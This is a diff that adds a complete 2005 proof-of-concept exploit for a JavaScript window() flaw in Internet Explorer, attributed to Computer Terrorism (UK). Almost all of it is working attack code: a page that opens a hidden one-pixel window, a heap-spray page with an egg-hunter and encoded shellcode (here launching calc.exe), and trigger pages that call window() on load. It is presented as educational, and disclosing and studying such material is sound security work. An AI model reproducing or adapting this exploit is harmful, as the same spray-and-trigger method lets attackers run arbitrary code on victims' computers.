@@ -1,0 +1,280 @@
+<!-- 
+Computer Terrorism (UK)
+
+============================================
+
+Microsoft Internet Explorer JavaScript Window() - Proof Of Concept
+
+============================================
+
+Author:
+--------
+
+Stuart Pearson
+Computer Terrorism (UK)
+www.computerterrorism.com
+21st November, 2005
+
+
+THE FOLLOWING PROOF OF CONCEPT IS PROVIDED EXCLUSIVELY FOR EDUCATIONAL 
+PURPOSES ONLY, AND IS PROVIDED "AS IS", WITHOUT ANY EXPRESS OR IMPLIED 
+WARRANTY. IN PARTICULAR, NEITHER THE AUTHOR NOR COMPUTER TERRORISM 
+MAKES ANY REPRESENTATION OR WARRANTY OF ANY KIND CONCERNING THE FITNESS 
+OF THIS CODE FOR ANY PARTICULAR PURPOSE.
+
+PERMISSION TO USE, COPY, PRINT, AND DISTRIBUTE THIS DOCUMENT FOR EDUCATIONAL 
+PURPOSES IS HEREBY GRANTED, PROVIDED THAT THE TEXTUAL CONTENT REMAINS INTACT 
+AND UNMODIFIED.
+-->
+
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="en-gb">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Computer Terrorism - Microsoft Internet Explorer Proof of Concept</title>
+<script type="text/javascript">
+
+function runpoc(iframecount)
+{
+
+document.getElementById('table1').rows[2].cells[0].innerHTML="<p align=center><B>
+<font color=#339966 size=1 face=Arial>&nbsp;&nbsp;&nbsp;&nbsp;loading, please wait....
+</font></p>"
+document.getElementById('table1').rows[4].cells[0].innerHTML=""
+document.getElementById('table1').rows[6].cells[0].innerHTML=""
+document.getElementById('table1').rows[7].cells[0].innerHTML=""
+document.getElementById('table1').rows[9].cells[0].innerHTML=""
+
+
+top.consoleRef = open('blankWindow.htm','BlankWindow',
+'width=1,height=1'
++',menubar=0'
++',toolbar=1'
++',status=0'
++',scrollbars=0'
++',left=1'
++',top=1'
++',resizable=0')
+
+top.consoleRef.blur();
+
+top.consoleRef.document.writeln(
+'<html>'
++'<head>'
++'<title>CT</title>'
++'</head>'
++'<body onBlur=self.blur()>'
++'</body></html>'
+)
+
+self.focus() // Ensure the javascript prompt boxes are hidden in the background
+
+
+for (i=1 ; i <=iframecount ; i++)
+{ 
+top.consoleRef.document.writeln('<iframe width=1 height=1 border=0 frameborder=0 
+src=fillmem.htm></iframe>')
+}
+
+if( iframecount == 8 ){
+//alert('8');
+top.consoleRef.document.writeln('<iframe width=1 height=1 border=0 frameborder=0 
+src=bug2k.htm></iframe>')
+}
+
+if( iframecount == 4 ){
+//alert('4');
+top.consoleRef.document.writeln('<iframe width=1 height=1 border=0 frameborder=0 
+src=bug.htm></iframe>')
+}
+
+//+'<iframe width=1 height=1 border=0 frameborder=0 src=bug.htm></iframe>'
+//)
+
+
+
+}
+</script>
+</head>
+
+<body onLoad="self.moveTo(0,0);self.resizeTo(screen.width,screen.height);">
+
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+
+<table border="0" width="100%" id="table1">
+<tr>
+<td>
+<p align="center"><font color="#333333"><b><font size="1" face="Arial">
+Microsoft Internet Explorer JavaScript Window() Proof of Concept</font></b>
+</font></td>
+</tr>
+
+<tr>
+<td width="98%" height="15">
+<p align="center"><b><font face="Arial" size="1" color="#333333">Select 
+your operating system:-</font></b></td>
+</tr>
+<tr>
+<td width="98%" height="10"></td>
+</tr>
+<tr>
+<td width="98%" height="27" align="center">
+<p><b><font color="#339966" size="1" face="Arial">
+-</font><font color="#333333"><font color="#333333" size="1" face="Arial"> </font> </font>
+<font color="#333333" size="1" face="Arial"><a href="#" onclick="javascript:runpoc(4)">
+<span style="text-decoration: none"><font color="#333333">Microsoft 
+Windows XP (All Service Packs)</font></span></a><font color="#333333"> </font></font>
+<font color="#339966" size="1" face="Arial"> -</font></b></td>
+</tr>
+<tr>
+<td width="98%" height="22" align="center">
+<p><b><font color="#339966" size="1" face="Arial">
+-</font><font color="#333333"><font color="#333333" size="1" face="Arial"> </font> </font>
+<font color="#333333" size="1" face="Arial"><a href="#" onclick="javascript:runpoc(8)">
+<span style="text-decoration: none"><font color="#333333">Microsoft 
+Windows 2000/Universal (Slower)</font></span></a><font color="#333333"> </font></font>
+<font color="#339966" size="1" face="Arial"> -</font></b></td>
+</tr>
+<tr>
+<td width="98%" height="15" align="center">
+</td>
+</tr>
+<tr>
+<td width="98%" height="15" align="center">
+<b><font color="#339966" face="Arial" size="1">invokes calc.exe if 
+successful</font></b></td>
+</tr>
+</table>
+
+</body>
+</html>
+
+--------------------------------------------------------------------------------------------------------------
+
+<-- blankWindow.htm -->
+
+<HTML>
+<TITLE>Blank Window</title>
+<body></body>
+</html>
+
+--------------------------------------------------------------------------------------------------------------
+
+<--    fillmem.htm   -->
+
+<HTML>
+<HEAD>
+<Script Language="JavaScript">
+function load() {
+
+var spearson=0
+var eip = ""
+var prep_shellcode = ""
+var shellcode = ""
+var fillmem = ""
+
+
+//
+// Address called by the bug (also serves as slide code)
+//
+for (spearson=1 ; spearson <=500 ; spearson++)
+{ 
+eip = eip + unescape("%u7030%u4300")
+//eip = eip + unescape("%u4300")
+}
+
+
+//
+// Create a large chunk for memory saturation
+//
+for (spearson=1 ; spearson <=200; spearson++) 
+{ 
+fillmem = fillmem + eip
+}
+
+//
+// Search for our shellcode (tagged with my initials) and copy to a more stable area
+//
+prep_shellcode = unescape("%u9090%uBA90%u4142%u4142%uF281%u1111%u1111%u4190" +
+"%u1139%uFA75%u9090%uF18B%uF88B%u9057%uc933%ub966" +
+"%u002d%ua5F3%u9090%u905f%ue7ff")
+
+//
+// Harmless Calc.exe
+//
+shellcode = unescape("%u5053%u5053%u9090%uC929%uE983%uD9DB%uD9EE%u2474" +
+"%u5BF4%u7381%uA913%u4A67%u83CC%uFCEB%uF4E2%u8F55" +
+"%uCC0C%u67A9%u89C1%uEC95%uC936%u66D1%u47A5%u7FE6" +
+"%u93C1%u6689%u2FA1%u2E87%uF8C1%u6622%uFDA4%uFE69" +
+"%u48E6%u1369%u0D4D%u6A63%u0E4B%u9342%u9871%u638D" +
+"%u2F3F%u3822%uCD6E%u0142%uC0C1%uECE2%uD015%u8CA8" +
+"%uD0C1%u6622%u45A1%u43F5%u0F4E%uA798%u472E%u57E9" +
+"%u0CCF%u68D1%u8CC1%uECA5%uD03A%uEC04%uC422%u6C40" +
+"%uCC4A%uECA9%uF80A%u1BAC%uCC4A%uECA9%uF022%u56F6" +
+"%uACBC%u8CFF%uA447%uBFD7%uBFA8%uFFC1%u46B4%u30A7" +
+"%u2BB5%u8941%u33B5%u0456%uA02B%u49CA%uB42F%u67CC" +
+"%uCC4A%uD0FF")
+
+
+fillmem = fillmem + prep_shellcode + shellcode
+
+prompt(fillmem,"Computer Terrorism (UK) Ltd - Internet Explorer Vulnerability")
+
+}
+// -->
+</Script> 
+</head>
+<TITLE>Windows Explorer Exploit</TITLE>
+<body onload="setTimeout('load()',2000)">
+test test test
+</body>
+</html>
+
+--------------------------------------------------------------------------------------------------------------
+
+<--    bug2k.htm   -->
+
+<html>
+<TITLE>Crash2</title>
+<body onload="setTimeout('main()',20000)">
+
+<SCRIPT>
+
+function main()
+{
+
+document.write("<TITLE>hello2</TITLE>")
+document.write("<body onload=window();>")
+
+window.location.reload()
+
+}
+</SCRIPT>
+<br><br><br><br><br><br><center><FONT FACE=ARIAL SIZE 12PT>Please Wait !
+</FONT></center>
+
+
+--------------------------------------------------------------------------------------------------------------
+
+<--    bug.htm   -->
+
+<html>
+<TITLE>Crash2</title>
+<body onload="setTimeout('main()',6000)">
+
+<SCRIPT>
+
+function main()
+{
+
+document.write("<TITLE>hello2</TITLE>")
+document.write("<body onload=window();>")
+
+window.location.reload()
+
+}
+</SCRIPT>
+<br><br><br><br><br><br><center><FONT FACE=ARIAL SIZE 12PT>Please Wait !
+</FONT></center>
